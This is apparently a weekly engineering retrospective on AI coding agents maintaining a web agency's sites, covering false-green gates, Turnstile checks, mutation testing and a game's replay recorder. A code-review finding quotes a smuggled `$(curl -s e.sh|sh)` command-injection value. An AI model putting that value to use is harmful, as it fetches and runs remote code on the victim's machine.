Tim filed a MarkUp round on Sep 1. Eight pins, worked through the `markup-review`
skill, landed as +3,774 / −965. Three things from it are worth carrying forward.

**"How can I enforce you remembering that?"** Tucker, Sep 1: _"we're done with
pixel matching for now, how can I enforce you remembering that? we're going to do
other webflow sites, so it is going to be a running theme."_ The answer was not a
note:

> _"The matching machinery is self-propelling by design — CLAUDE.md rule 5 is a
> loop ('after committing run next.mjs; while it exits 1 the round continues')
> and next.mjs ends with 'Round continues. Do not hand back control with work
> outstanding.' With 24 open regions it will always exit 1 and always read as an
> instruction. So the pause is an exit code, not a note. **A note loses to a
> loop**: the loop is mechanical and the note is not."_

`matching/PAUSED` is a file the tooling checks _first_, before any report is
read. And the `.gitignore` detail is what would have silently defeated it:
`matching/*` was whitelisted **by extension** and `PAUSED` has none, so the
switch was ignored — _"an ignored switch is not a switch."_ Then it was lost
anyway: the pause switch and a docs fix were **orphaned when a PR was closed
rather than merged**, and had to be re-landed.

**The eight "pre-existing" reds were the instrument finally working.** A ledger
logged eight interaction failures as pre-existing and left them. They were
neither old nor flaky:

> _"They date from the Sep 1 install of `@reddoorla/maintenance` 0.90.1, whose
> `4c79cfa` moved `reducedMotion: "reduce"` into the shared Playwright base under
> `use.contextOptions` — the place Playwright actually reads it. Every earlier
> copy sat at the top level of `use` and was dropped silently, so **this suite had
> run with motion ON since June**. The 8 reds were the first run in which reduced
> motion was genuinely in force."_

So three motion tests had been measuring the ramp when they were supposed to be
measuring the reset — **for three months** — and the fix to the harness surfaced
as eight new failures a session had already filed under "ignore". (This is the
same defect found on 2026-08-12 in week 3; what week 6 adds is the three-month
blast radius.) **A config key in the wrong place fails silently in exactly the
direction that makes a suite look healthier.**

**A production defect nobody had seen because live's copy was shorter.** Tim's
screenshot showed "Request" painted over "Appointment". Root cause: the pill
inherits live's `.button` with `line-height:0`, so _"a label that WRAPS does not
grow the pill — the second line lands on the first line's baseline and the words
paint on top of each other."_ Live never showed it because live's label is "Book
Appointment" (283 px at 25 px); the MarkUp pin had renamed it "Request
Appointment" (315 px) into a 300 px column. Probed in Chromium **and** WebKit at
1024/1200/1440 — "not a Safari thing" — and the counting method mattered:
_"Counting distinct line tops finds nothing, because the tops are equal; the
probe counts fragments."_

## vida-legacy-foundation — a site in four days, and the gate that watched nothing

Tucker opened it on Sep 1 at 17:41: _"it happened, we have our first new site to
add to the fleet! 1) do a deep review of our structure and see if there's
anything we should change before building our site, and then 2) look into vlf in
discord and my email, let's see how much of this you can build with this
system."_

**The measured shape**: four days, 51 commits, 49 PRs, 22 sessions by the
repo's own retrospective; 83 commit rows and 55 PRs (+23,357 / −3,802) in the
corpus — the highest of any repository this week — and **54 of the week's 93
interruptions.**

The commercial context is in Discord, not the repo. Erik, Sep 2: _"We're already
into overages on this site, so as efficiently as possible, pretty please."_
Tucker, on the donation form: _"probably the best option is just linking out to
them honestly, i can't find any api to connect to… especially if we've already
overrun this project before i even started developing."_ The donation form
shipped as external links behind a `show_form` switch — **a scope cut made for
budget, implemented so it can be reversed.**

**Then, on day five, Tucker asked for the retrospective**, and this is the part
worth full attention:

> _"Review these sessions, how we built this site against the figma and create a
> timeline of everything you did, and put it into one document. And then make
> recommendations on what we can change process-wise to improve for the next
> site. Also, add to the starter CLAUDE.md and all the other repos I have on this
> machine, I want every repo to maintain a workJournal, similar to the one that I
> have in smahre/Broken."_

The retrospective was written by **seven researchers taking a slice each, with a
second agent fact-checking every slice against the repo — 48 corrections
returned.** The check earned itself on its first finding: the draft said
connecting Netlify to the repo needed a human, _"which was true when issue #7 was
filed at 00:08:35Z and false by 00:14:51Z, when the same session did it over the
API."_ **Six minutes.**

**The false green.** The headline finding is the cleanest instance of this repo's
founding rule in the whole corpus:

> _"the axe gate audited no real page of this site for four days while every
> slice PR reported 'axe 0 violations'."_

`pkg.reddoor.a11yRoutes` was absent, so the audit scanned the two dev fixtures
and **no page of the site**. The fix was _"eight strings in package.json"_. It
was correctly diagnosed on **day three** and written up as a documentation
correction — and then _"waited two more days"_, because a diagnosis written into
prose is not a tracked item. The fleet's own comment on that config key records
the prior incident, from week 1: scanning only fixtures once let a critical
`image-alt` violation ship to five production pages with CI green. **The same
instrument failed the same way twice, and the second time it was diagnosed and
still not fixed for 48 hours.**

**The recurring bug shape, named.** Not one bug — a shape:

> _"a green granted on the absence of an error string rather than on evidence of
> health. /health's turnstile flag is a truthiness check on an env var;
> `rendered` meant a div the starter emits whenever that var is set. Each fix
> reintroduced the same shape one step along, and the last survived by exactly
> one error code."_

**The cost of measuring late.** The Figma parity harness was built on day three,
after all 17 slices had merged, and _"immediately cost three PRs re-doing pages
already called done, plus nine on the sticky-band mechanism it should have
specified once. The two facts that drove almost all of it are invisible in a
screenshot and absent from `get_design_context`'s output, and both were
extractable from the design's own data on day one."_ Tucker had asked for exactly
this on Sep 3: _"I need you to use a more robust method of checking your output
vs the figma."_

**The mutation audit — the module at the centre of the lesson had no test.** A
`pnpm test:mutate` pass over `src/lib`, `src/params` and the handlers,
deliberately outside `verify` and CI (nine minutes; _"its output is a reading
list rather than a pass/fail"_). First run: **81.21% — 1,219 mutants, 989 killed,
191 survived, 38 never reached.** The headline was fine; the clustering was not.
`src/lib/turnstile.ts` scored **40 with no unit test at all** — _"the module
whose misconfiguration buckets every real lead as spam, and the origin of the
whole positive-evidence rule"_ — and emptying its entire `onerror` handler
survived, which _"leaks a dead `<script>` into `<head>` AND never clears the
cached promise, so one network blip disables the widget for the life of the
page."_ Both route param matchers scored **0**: replacing the lang matcher with
`() => undefined` makes every `/es` path a 404, silently. `/health`'s `export
const prerender = false` flipped to `true` **survived** — _"The fleet polls that
endpoint; prerendered it reports the CI machine's state forever, with
`ok:true`."_ And blanking the sitemap's `lang: "*"` survived: _"the Spanish half
of the site vanishes from the sitemap, suite fully green."_ Six files went from
~50% combined to 94.44%, and **153 survivors were filed as issues rather than
fixed** — the retrospective's own rule that a code comment is not a tracker,
applied immediately.

**And then the retrospective was itself audited**, producing the week's sharpest
single finding about agents:

> _"an agent asked how the field stops coding agents making confident false
> claims reported that this repo's CLAUDE.md still carried the stale
> `a11yRoutes` paragraph. It does not — #55 removed it. **The agent reasoned from
> the retrospective text in its own prompt and never opened the file.**"_

Two of the retrospective's own beliefs were corrected in the same pass. **The
parity harness is a commodity** — uiMatch is open-source with a fidelity score
and CI exit codes, Fidel is $29, Uiprobe has been free since April, and Figma has
bought the leading OSS visual-diff team; _"ours is 542 lines with no score, no
threshold, no exit code."_ The recommendation to measure early stands on its own
evidence; _"'build it yourself' does not."_ And _"the thing we are actually ahead
on — the corrected trap corpus plus this journal, read by an agent before it acts
— got one sentence, filed under secondary."_ One recommendation turned out worse
than unimplemented: _"both browser gates run `npm run vite:dev`, so the harness
enforcing the other nine contradicts it, and all 67 assertions in the new matrix
inherit the problem."_ And one piece of honest accounting about documentation
inflation: _"the review says plainly that this took it from 963 lines to 1,005,
against its own recommendation to split it. Every addition was defensible alone.
**That is how a file gets to 963.**"_

Finally, on Sep 5, uiMatch 0.4.0 was **run rather than read about**: defaults fail
every real page; with the right viewport and sizing the nav scored 31 on ground
colour and the donate page 69 _"with a 46.1% area gap that is CORRECT (the comp
draws the form we hide)"_; the only typography finding was a font-family
slug-vs-display-name mismatch with no size, line-height or position delta — _"a
pixel regression gate, not a typographic diagnosis. Not adopted."_ The same PR
corrected a belief that had stood since day three: **the font trim is per STYLE,
not per family.** Measured: Pragmatica Extended 300/60 reports a 42 px box on an
81 px line-height, each carrying `style.leadingTrim: "CAP_HEIGHT"`, while the
10 px field label — also Extended — is untrimmed at box = line-height = 15.
_"pull-figma.mjs saw the 42px box for a week and could not say why."_

## The report rewrite, driven by long operator critiques

`reddoor-website` took 47 commits this week, nearly all on the audit report
renderer, and the driver is a small number of very long Tucker messages. They are
worth reading as a class: **he does not ask for a fix, he reports what the
document did to him as a reader.**

The 1,372-character one, abridged:

> _"use the whole content with… kill the maxwidths you've built for the rest of
> the content, that's what the contentwidth is for and everything feels too
> compressed. use our heading styles, they're defined for a reason… the 'what an
> AI already says about you' section uses way too much vertical space… we spend
> three vertical page widths on the AI being right and using our content; that's
> a 'I checked this and it's good' not listing stuff out. You lead and emphasize
> the right thing (we're hard to disambuiguate, a real problem), but you give no
> solutions and then go into all the things that are working."_

The 1,749-character one contains the most substantive correction of the week on
this tool:

> _"the 'your site does not say this' is a very confusing, and in our case,
> untrue, our address is in texas and we have it on our site. I think rather than
> pulling a statement, unless it's soemthing they obviously wouldn't want said
> about them, we just show them who else the AI is citing… one 'Reddoor Creative
> shows very low business activity compared with other companies in its sector.'
> is a direct diss we don't like to see an agent saying about us, **that's the
> lever that motivates someone to try and change something**… our site also
> defintely has more than 20 pages, so I don't know how we're copunting but its
> wrong."_

Every one of those landed as a named commit the same night. He also challenged a
scoring premise directly — _"did we every actually determine that engines need
you to not have js? that's a lot of points for something base don the vercel
study from years ago"_ — and the assertion was removed from the methods rather
than defended. The strategic frame he stated once and it stuck: _"AEO is a frame
or the trojan horse to get people to click on something and engage us to help
tell their story."_

Two structural notes. `reddoor-website` moved to a **staging → main, merge-only**
flow this week at his instruction — _"the goal going forward (here and
everywhere) is to build a system where everything goes through staging before it
gets to main, so limiting to merge is ideal"_ — which required one 3,094-line
promote PR to end a squash divergence. And he asked for two ideas to be **filed
rather than built**: a cockpit rework, and _"a 'design review' tool, we have a
wealth of notes and review data from me working with nicole tim and erik, that I
think we can find some rules that can be tested programmatically… especially if I
want to be using less intensive models."_

## A client ask becomes fleet plumbing, and the release gate becomes a treadmill

Gallery Sonder wanted custom RSVP confirmation copy. What shipped that day was a
fleet capability: CMS-authored auto-replies with calendar invites (**+2,772 /
−4**), then rich text bodies and per-form-type defaults, then a bug fix, then an
async payload builder.

Tucker deliberately widened the scope and said so: _"yeah the fleet stuff is
investment in our stack, don't worry about scope any more, I'll deal with that
side of things, you just do the work. and use your own work tree for this please,
we have other stuff going on parallel to this that's unrelated."_

**The friction is in the release cadence.** Seven `chore(release): version
packages` PRs merged this week — human-merge-only by policy. Three of them on
Tuesday within 65 minutes; four on Thursday evening. Each required Tucker to stop
what he was doing, publish, and tell the agent: _"just released the changeset"_,
_"published the release, send me that email"_, _"merged, waiting on changeset to
merge, then will merge the email stich"_, _"just merged the release"_,
_"landed?"_. On Friday morning the agent shipped a `workflow_dispatch` trigger for
the release — **a small automation bought with a full evening of manual
round-trips.**

## Turnstile — four PRs, and the correction needed correcting

This is the week's densest instrument episode, and unlike the others it is fully
self-documented in four consecutive commit bodies.

**#691 — the verdict was a truthiness check.** The `Turnstile widget` column was
written from `/health`'s `forms.turnstile`, which is
`!!PUBLIC_TURNSTILE_SITE_KEY?.trim()` — _"a truthiness check on a string that
never contacts Cloudflare."_ Deploying with the sitekey of a widget already at
Cloudflare's 10-hostname cap therefore reported **pass** while the live widget
threw 110200 and minted no token. Under `Require Turnstile` **that buckets 100%
of real leads** — and _"the false pass satisfied BOTH halves of the guardrail
meant to catch it (the red digest item needs 'fail', the amber cockpit watch
needs !== 'pass')."_

The fix is asymmetric and is the generalisable idea: **false → "fail"** (no key
IS proof the widget cannot work); **true → null** (a key is NOT proof that it
does). The same PR found the failure hiding in two more places, including a
generated smoke suite that allowlisted `/turnstile|challenges\.cloudflare/i`
against `pageerror` as well as console output, _"so the uncaught TurnstileError
was discarded by name."_

**#693 — the runbook written that morning would have condemned a working
widget.** Two claims in it were contradicted by measurement taken the same day:
_"'.cf-turnstile has an iframe child' — the fleet's widgets are invisible mode
and solve without leaving one. The healthy VLF widget was measured with ZERO
iframes and a valid 773-character token in the same instant. Following the old
text, an operator condemns a working widget."_

**#694 — and #693 was itself wrong, in the dangerous direction.** Written the
same day, corrected the same day:

> _"'form-e2e swaps in Cloudflare's always-pass test sitekey' is FALSE.
> `CF_TEST_SITEKEY` reaches exactly one expression… injected as the VALUE of a
> hidden `cf-turnstile-response` input. Nothing writes `data-sitekey`,
> `page.route` or `addInitScript`. **The real widget renders with the real key on
> every nightly run**, against 6 sites' live contact forms. The code's own comment
> at :501 already said so. **The probe is generating the evidence and discarding
> it.**"_

And a second overstatement: a green smoke run does _not_ rule out the
wrong-hostname state, because fleet-smoke is clone-based and the site key is a
Netlify variable absent from the clone, so the widget renders nothing and no
error is ever thrown. **"The guard is correct and inert here."** The net
statement now sits in the runbook and is the honest one: **"nothing automated
observes a production Turnstile widget on its production hostname. /health sees
an env var, the smoke suite sees a keyless local build, form-e2e sees the real
widget and ignores it."**

**#695 — the verdict moves to the only thing that can earn it.** form-e2e now
writes the column, with a five-state mapping and three load-bearing constraints
each pinned by a test. The one to carry forward: **the cron order forced the
move.** function-health runs 08:00, the digest reads 09:23, form-e2e writes 10:15
— _"with both writing, function-health's null would clear every browser verdict
each morning before the red alarm ever saw one."_ And: **absent is not null.** A
run with no opinion omits the key; only a run that looked and could not tell
clears the cell. _"Collapsing them lets a probe that cannot see Turnstile erase a
real verdict — caught by the existing suite when the first draft did exactly
that."_

**Four PRs in under nine hours, two of them corrections of the previous one, on a
single boolean column. That is what it costs to establish what one instrument
actually measures.**

## Broken — the recorder was pointed at nothing

A personal Godot project, in this chapter because the same failure mode appeared
here in a completely different stack in the same week, and was handled better
than in the fleet.

**The transport.** Gameplay "tapes" were posted through Netlify Forms. Tucker,
Sep 4: _"to be honest, this solution seems pretty fragile, and won't survive
other builds and using this off of netlify, let's reconsider and find a different
way to do reporting."_ The commit that replaced it opens by quoting him and
conceding:

> _"Netlify Forms lasted one day and lost at least four tapes. The defect is not
> a bug, it is the transport: **Netlify answers 200 to submissions it does not
> keep**, so no reading of the response distinguishes delivery from silence.
> Proved on one machine inside one minute."_

The replacement is a Cloudflare Worker returning `{"ok":true,"id":N}` — _"the id
is the design: a thing that exists and can be quoted, instead of a status code
meaning 'something answered'."_ The old path was deleted rather than kept as a
fallback: _"a silent path beside a working one means trusting neither."_

**Tucker forced a review before the deploy** — _"please do a full review of the
tape sink code AND logic before you do that, and when we're doing a full feature
like this in future we need to go throught the Design, Spec, and Plan steps
before we build things please."_ The review ran six reviewers with every finding
handed to a separate agent told to refute it: **35 raised, 19 refuted, 16
confirmed**, in code written the same evening and one command from deploy. The
worst finding: _"The KV key was built from the caller's own room and run
strings… so a tape posted with a room of `$(curl -s e.sh|sh)` stored itself under
that key, and this service's own README tells a person to copy a key out of `kv
key list` and paste it into `kv key get`. **A command injection into my own
instructions.**"_ And a delivery lie: the sink returns a string id, the panel ran
it through `int()`, and Godot's `to_int()` keeps every digit rather than stopping
at the first non-digit, so a real key printed as a nonsense number and fetched
nothing — **"delivery true, proof fiction."**

**Then the instrument itself.** Replaying the three tapes Tucker had sent found
that two carried **no position checkpoints at all**:

> _"CellRunPanel armed the recorder from its own `_ready` with
> `Tape.watch(_room.wrench)`, and a single room builds its wrench in ITS
> `_ready` — Godot readies children before parents, so the panel asked first and
> was handed null every time. **Nothing complains**: `watch(null)` is legal,
> `sample` skips the checkpoint branch, and the tape records, sends and replays
> exactly as before while carrying nothing a replay can be checked against."_

And the reason the suite could not catch it is the reusable part: _"every check
in tapeSmoke arms the recorder by hand on the line after building the room,
exercising a path the game does not take."_ The new check asks it of the real
scenes: **0 checkpoints in 65 ticks before the fix, 3 after.**

**Tucker then set the priority explicitly**, and this is the sentence that should
travel furthest out of this week:

> _"C and A, getting this right should be our first priority, getting all the
> movement and physics right has to come before we build anything else, and
> **getting correct feedback on the physics is how we get physics and movement
> right**."_

The commit titles that follow are a compressed lesson in proving an instrument:
_Task 4: one command, and it found two bugs immediately_ · _Tasks 5 and 6: a
browser in the loop, and it disagrees with me_ · **_Task 7: the harness's first
act was to refute the reason it was built_**. That last one measured
cross-runtime drift at **0.16 px, not the 16.7 px the design had been built
around** — _"the two runtimes agree with each other to a seventh of a px while
both disagree with his run by sixteen — so whatever is wrong with that replay is
not the runtime, because both runtimes are wrong about it identically."_

Two more corrections followed, in opposite directions, within 24 hours. The
recorder's clock had been counting **frozen** frames — _"the boot card pauses the
whole tree until the first tap, so a tape's opening ticks were spent frozen while
the counter went on, and a replay simulated them for real — 229.78 px and a move
that never happened."_ Proved without a phone: the same scripted run recorded
behind a 0-tick and a 55-tick freeze produces **byte-identical files**. Then a
real phone tape against the fixed build read **0.07 px over 6,060 ticks / 101
seconds, 38/38 events, EXACT** — where the same room on the previous build read
229.38 px. And that same tape **overturned the previous day's correction**:
phone-browser → browser replay 0.07 px EXACT, phone-browser → native replay
**545.44 px, 29/38 MISSING**, traced to _"a contact landing 64 ticks late at tick
1307 — 21 seconds in, past where the 15-second pair stopped looking."_

The note left in that commit is the most disciplined sentence in the corpus this
week: _"the note left there yesterday — that reversing an agreed spec on my own
measurement is the move this project made a rule against — is why there was
nothing to undo."_

## Calibrating the battery against sites nobody controls

Tucker's ask on Sep 3 was volume: _"can we brainstorm some more 'does it work?'
tests?… more tests read as more value, even if they're trivial, getting up to 100
tests would be great… check that there's a favicon, check that there's a sitemap,
click some buttons, etc. give me a list starting with the easiest adds… tests
should be in order of how much effort/cost to implement."_

**The agent pushed back with a rule, and Tucker took it: greenability** — _"a
check no ordinary good site can pass is measuring fashion, not care; a check
everything passes is padding unless it folds into 'What Passes'."_ Later sharpened
to _"being correct is not sufficient grounds to occupy a row."_ Of 119 candidate
checks, **94 survived**, graded in a 447-line spec. Four check states were
introduced — `pass` / `fail` / `unmeasured` (our gap) / `not-applicable` — with
only pass+fail in the denominator, on the founding constraint **"never report our
missing measurement as their defect."** Admin-path probing was cut on Tucker's
agreement because _"it reads as reconnaissance against a stranger's site."_

**Then the calibration, which is the good part.** Tucker: _"we're going to run
these all against our own site and other 'good' sites to make sure they pass once
the battery is set up."_ The sequence and his reactions: _"great, let's validate
against reddoor"_; then **"76 checks 53/67 passing doesn't scan, what's going on
there"** — he caught the arithmetic before reading a single finding; then _"did
you fix the flake bug?"_ — demanding proof, not assurance; then _"alright, see if
this runs on apple.com"_ — a deliberately known-good control; then _"cut
noopener, talk to me about the checks apple failed in more detail and see if you
can justify keeping them in the suite"_; then **"would any of these provide actual
value to apple to know? I suspect these things would've been flagged if they were
a real issue with the budget behind that site"**; then _"do you have another site
you'd want to look at as 'known good' to calibrate?"_ → viget.com. And on a check
he was not convinced by: _"i think that most sites are going to have this issue
and I'd need you to have strong evidence that it's an actual problem worth
flagging."_

**This is the house rule inverted and used as a design tool:** rather than prove
a gate passes on a known-good input before trusting a fail, the battery was
**built against known-good inputs from the start**, and every check that fired on
Apple or Viget had to justify its existence or be cut.

**One safety catch was Tucker's alone.** The Tier 4 probe submits an empty form
and an invalid-email form to a prospect's live contact form, so running a
calibration corpus sprays two junk submissions at every site in it. Tucker, Sep
5: _"add the probe forms false switch and use it, we don't need to be sending off
a load of chaff to potential clients."_ **Nothing in the harness had raised
this.**

## The journal opens, CLAUDE.md comes back into version control, and a fleet sweep hits a wall for the third time

Three things landed together on Saturday and the ordering is the story.

**11:10–13:33 — the sweep.** Tucker's instruction — _"I want every repo to
maintain a workJournal"_ — fanned out to **38 repositories**, each getting an
adopt commit plus a follow-up. Measured outcomes: **35 repos merged a PR; 4 did
not.** Three of the four are the known un-pushable set. The sweep also **redded
CI in two repos on a documentation-only change**, because `prettier --check`
covers markdown.

**14:35 — CLAUDE.md is tracked (#699), reversing a standing decision.** It had
been excluded in `.git/info/exclude` because the repository is public and the
file names where the Discord bot token lives, the guild id, and which members of
a client channel are staff versus client. _"A rollout session stopped rather than
commit it today, which was the right call to make without asking."_ Tucker's
ruling: _"bring the reddoor main CLAUDE back into version control and add it,
this si a decision."_ The reasoning, as recorded: **none of it is a credential
value** — _"the token line says where the secret lives, not what it is"_ — and the
one genuinely confidential line goes public knowingly. The argument for doing it
is the same as the argument for the journal: _"The standing rules for the most
complex repo in the fleet existed on exactly one machine — not reviewable, not
diffable, absent from any fresh clone, and one `rm -rf` from gone."_

The journal's first entry is an explicit backfill and says so in its own first
paragraph — _"Detail below this line is trustworthy; detail above it is not"_ —
and it records one mistake the session made that day: a `git checkout main && git
pull` in the main checkout where **the checkout failed silently** (main was
already checked out in another worktree) _"but the `&&` chain still reached `git
pull`, which merged `origin/main` into `feat/audit-check-battery` and left a merge
commit on another session's WIP branch."_ It was not undone, because by the time
it was noticed the other session had committed on top. _"This is exactly the
collision CLAUDE.md's 'never commit from the main checkout' rule exists to
prevent, and it happened by treating a shared checkout as a place to run a quick
read-only command."_

**14:56 — `fleet-repos.sh`, written after the wall was hit.** _"Third occurrence
of the same failure."_ The mechanism is now stated plainly enough to be
memorable: _"archived is invisible from inside a clone. `git remote -v` shows an
ordinary URL, `git ls-remote` succeeds, `git fetch` succeeds; only the push
fails, and only after every commit already exists."_ It also got reported wrongly
that same day — a session told Tucker two repositories had "dead remotes", which
is a different problem with a different answer. Implementation notes worth
keeping: **one `gh repo list` per owner, not one `gh repo view` per repo — 3 API
calls instead of 39, 3.9 s instead of ~40 s**, _"the difference between running
it every time and not bothering"_; and written for **bash 3.2**, because the
first draft used associative arrays and _"died on `declare: -A: invalid
option`"_ on the operator's own machine. One incidental finding: the checkout
`welcome-to-the-flower-court` is `tucksravin/invitations`, so the script maps by
remote, not directory name.

**Two sessions hit the same wall the same afternoon, independently.** At **14:32
— twenty-four minutes before the script merged** — Tucker wrote, in the _vida_
session rather than the maintenance one that was building it: _"i feel like you
consistently get hung up on archived repos, is there a way we can fix that?"_ So
the fix was in flight in one repository while the same failure was being
re-encountered in another, with no shared signal between them. **A script in
`reddoor-maintenance/scripts/` is not knowledge in a site repo's session. The
tooling and the standing instruction that makes any session reach for it are two
different deliverables, and only shipping both closes the loop.**

## Welcome to the Flower Court — one ask to a live site in two hours

At 10:57 local: _"I want to build an app using the reddoor stack that let's me
send invitations for storygames, murder mystery parties, and other things that I
run, custom themes each time… Let's make a plan to do this, take whatever time
you need and ask me any questions you have."_

The morning's design was a real product — Turso, per-guest HMAC links, a typed
field kit, a theme engine, an admin authoring UI: **a two-week build.** Then at
12:20: _"how would scope if I want to send out invites by end of day today?
doesn't need to be reusable, we can rebuild into a bigger project with the
lessons we learn building this."_ Shortly after, Turso was cut entirely in favour
of emailing the responses.

**The site was live at a custom domain at 12:53 — 1 h 59 m from the first
message.** The journal's governing rule: _"cut the abstractions, keep the
mechanisms — the abstractions designed against a single event are guesses, and
they are exactly what a second event would force you to redesign."_

Three beliefs corrected on contact, all of them about _time_. _"'Email is the
risky part; cut it to protect the deadline.' Wrong, and it reversed completely…
`reddoorla.com` is already verified in the existing Resend account. **Check what
is already verified before pricing a DNS round-trip into a deadline.**"_ _"'The
custom domain will be the slow step.' It was instant."_ And _"'Turso sharing the
fleet group is urgent.' I called this urgent and it was overcalibrated."_

**And the best design outcome came from the constraint, not despite it.** With no
database there is no way to show which playbooks are taken, so two guests could
both claim the same one. Rather than build a race that cannot be arbitrated, the
form asks for a **ranked top three plus an opt-out list** — which Tucker then
confirmed is how he already casts. _"The no-database version of this feature is
not a degraded version, it is the correct one."_ A privacy problem was likewise
solved by reading rather than engineering: the one genuinely sensitive field was
removed from the invite entirely, because the game's own text has players fill
their sheet in at the table.

**What tests did not catch.** The journal is blunt: _"Everything below passed
`svelte-check`, built clean, and passed axe. They were found only by
screenshotting the deployed page at 390px and looking at it."_ The corner bloom
sat on top of the first letter of every alternating playbook card — "Contex"
rendered as "ontex" — because the mockup mirrored the bloom to follow the notched
corner, _"which works when the card is a design comp and breaks the moment a real
heading occupies that box."_

Then it was rebuilt the same afternoon on a paged/swipe model, and the vertical
scroll-snap was **added, removed and re-added** in one day — 15:54 add, 17:42
drop, then _"ok i want to try snap scroll again, breaking up content into more
screens and setting it to always be svh"_, then 20:41 the snap spine returns at
21 screens. Tailwind v4 was added at 19:21, _after_ the site was already written
by hand. **This is the cheapest observable instance in the corpus of the operator
using a live site as the design surface** — three round trips on one mechanism,
each about ninety minutes, all on his own project where the cost is his alone.

Sunday was physical production: twelve sigils as papercut data, SVG paths
flattened to polylines, cut files sized for a Cricut, dossier and name-slip PDFs,
and twelve emails sent. Notable operator note mid-stream: _"the svg all is way
too big for the cricut"_ — **a physical constraint no gate in the repo could have
expressed.**

## The smaller threads

**gallerysonder — the operator's voice is not the agent's to write.** A long
client thread about GTM access produced the clearest register correction of the
week. After the agent returned a full pastable email: _"sorry, I'm not going to
use your whole pastable response, that's clearly not how I write, compress it
down to one sentence that I can rewrite in my voice."_ And then, generalising it:
**"overall note, I like to have the data and write my own emails, when I paste
one in, I'm asking for feedback and not a rewrite."** He also corrected the
agent's model of the _purpose_ of a sentence: _"I'm naming our stuff do give him
a graceful way to realize he's wrong."_ The pattern across the thread is
consistent — he wants facts checked (_"anything incorrect in my reply?"_, asked
three times over successive drafts), not prose produced.

**revogen — pixels are part of the promise.** After a Rive fallback fix: _"the
fallbacks we added are visible behind the rives, please fix and make sure to
check in future that the pixels don't change if you promise a change of this
nature."_

**the-bench.** _"new feature time, but before that let's do some organizing. I
want this to be part of a monorepo that has the context for all my workshop
projects."_ Spec → plan (12 tasks, board gates before deletion) → execution, with
one commit explicitly re-baselining the verification gates _"at migration start,
not at spec time"_ — the gate's reference point recognised as stale before it was
trusted.

**caldea — and the countermeasure that shipped is a colour.** Running many
sessions at once, Tucker asked: _"is there a way to color the top bar differently
for different vscord windows? when I'm running a bunch of them I sometimes ask
the wrong message in the wrong chat like that?"_ Not hypothetical — on Aug 31 he
had written into the wrong session and had to stop it: _"wait are you working on
sonder or broken right now?"_ … _"yes please stop i have a parallel agent in
broken."_ The fix went through four iterations of taste (_"ok this is a little
much, can we just do the top?"_ → _"what does just the activity bar look like?"_
→ _"bring all the colors 60% of the way to the atom dark color"_ → _"push those
colors ~20% closer to the bg atom color, this is a hint not a primary ui
element"_) and ended on the status bar with a per-repo hex palette tracked in the
starter. **A misrouted prompt is a real failure mode of the parallel-session
workflow.**

## Corrections and course-changes — week 6

- **"didn't we say we were killing ai visibility as a score?"** — a decision
  made, written down, and reasserting itself in output anyway.
- _"merge the greens, and yes, I'd rather still see the steps"_ — pushing back on
  a collapse that would have cost legibility, and getting a derived gate instead.
- _"we're done with pixel matching for now, how can I enforce you remembering
  that?"_ — which produced **"a note loses to a loop."**
- _"I need you to use a more robust method of checking your output vs the figma."_
- _"add the probe forms false switch and use it"_ — the operator catching a
  harness about to spray junk at prospects.
- **"76 checks 53/67 passing doesn't scan, what's going on there"** — arithmetic
  caught before a single finding was read.
- _"would any of these provide actual value to apple to know?"_
- _"did you fix the flake bug?"_ — proof rather than assurance.
- _"i feel like you consistently get hung up on archived repos, is there a way we
  can fix that?"_ — in a different session from the one fixing it.
- **"overall note, I like to have the data and write my own emails."**
- _"make sure to check in future that the pixels don't change if you promise a
  change of this nature."_
- _"bring the reddoor main CLAUDE back into version control and add it, this si a
  decision."_
- _"yeah the fleet stuff is investment in our stack, don't worry about scope any
  more."_
- _"when we're doing a full feature like this in future we need to go throught
  the Design, Spec, and Plan steps before we build things please."_
- _"wait are you working on sonder or broken right now?"_ … _"yes please stop i
  have a parallel agent in broken."_

---

# Week 7 — 2026-09-07 to 2026-09-12

> Transcripts full, and this is the densest week for contemporaneous prose: two
> repositories wrote **41 work-journal entries between 09-08 and 09-12**
> (reddoor-maintenance 21, 29-navy 21), plus one each in reddoor-website and
> claude-skills. 306 commits / 305 unique SHAs across 16 checkouts — 248 Tucker's,
> 57 Renovate's. 123 PRs opened, 92 merged, **0 GitHub reviews on any of them.**
> 737 CI runs, 12 real failures.
>
> Two caveats change the numbers. `sessions.jsonl` attributes a session to its
> **start** day, and two megasessions carry almost the whole week (72.9 h and
> 88.2 h), so Friday 09-11 reads as "13 sessions / 353 tool calls" while actually
> carrying 38 commits, five journal entries and a major design correction — **do
> not use per-day session counts for this week.** And the prompt corpus overstates
> operator input by ~3.3×: 690 raw rows → 383 unique → **209 messages Tucker
> actually typed.**

A recipe that packages "match a reference page" as an installable gate was
shipped and then found to be lying in four separate ways — every one of them
discovered by _using_ it on a real client rebuild rather than by reviewing it.
In parallel the prospect report grew an operator-edit layer whose first three
proof attempts proved nothing. And the week's most expensive single correction
was not technical at all: **Tucker noticing an agent had rebuilt a component that
was already sitting in the repo, for the second time in one day.**

## Monday: the fleet updates itself, and nobody is home

MEASURED: 37 of Monday's 39 commits are Renovate's — pnpm v12, vitest v5,
changesets v3, google-auth-library v11, resend v6, listr2 v11, slice-machine-ui
v2, `@prismicio/svelte` v2 and lockfile maintenance across eight repositories.
**Zero PRs opened, zero merged, zero CI failures.**

This is worth one paragraph only because it is the baseline the rest of the week
should be read against: **the dependency lane genuinely runs without Tucker.**
The two typed prompts on Monday are both on a personal paper-craft project — one
of them asking an agent to design a paper-folding jig. INFERRED, from the absence
of any session with tool calls against a client repo: Monday was a day off, and
the Monday batch that cost five emergency holds in week 2 is now boring, which is
the desired end state.

## "what's going on with the erp vuln" — a red that nothing could fix

Tuesday's first typed words, 12:01: **"what's going on with the erp vuln"**.

Two fleet repositories had been red for five days on Dependabot alerts filed
against a `package-lock.json` **deleted in June**. GitHub's dependency graph
keeps serving a manifest after the file is gone, so the alerts name a file no
bump can reach and no toggle can suppress on a public repository. Both were
dismissed as inaccurate. Tucker's next message, six minutes later: _"yes please
fix and add that issue"_ — the issue asking the security audit to tell an
unfixable finding from a fixable one.

**Why this belongs in a workflow retrospective and not just a changelog:** the
signal was a permanent red the tooling had no vocabulary for. It cost a human
prompt to resolve, it will recur on a third repository already latent with the
same shape, and the audit that surfaces it is **still blind to the distinction as
of Saturday.** This is a _class_ of alarm the fleet can generate but not
classify, and a permanent red in a band that is supposed to mean "act now" is
exactly how an alarm channel gets trained to be ignored.

## The check battery lands, and the replay catches the fix that claimed to fix it

The audit "check battery" — 46 checks over a crawled prospect site — had been
sitting at forty commits with no PR. Tucker at 12:31: _"alright let's do some
